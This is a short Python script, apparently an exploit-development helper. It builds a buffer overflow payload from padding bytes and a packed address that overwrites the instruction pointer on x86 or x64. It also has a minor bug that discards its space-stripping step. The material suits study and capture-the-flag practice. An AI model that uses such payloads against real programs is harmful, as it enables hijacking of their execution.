#!/usr/bin/python3
import struct
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-o", "--offset", help="Number of bytes to offset", required=True)
parser.add_argument("-a", "--address", help="New instruction pointer address", required=True)
parser.add_argument("-x", "--processer", help="86 or 64", required=True)

args = parser.parse_args()

offset = int(args.offset)
address = args.address.replace(" ", "")
address = args.address.replace("\n", "")

if args.processer == "86":
    new_ip = struct.pack("<I", int(address, 16))
elif args.processer == "64":
    new_ip = struct.pack("<Q", int(address, 16))

payload = b"".join(
    [
        b"A" * offset,
        new_ip
    ]
)

print("[+] Payload:", payload)
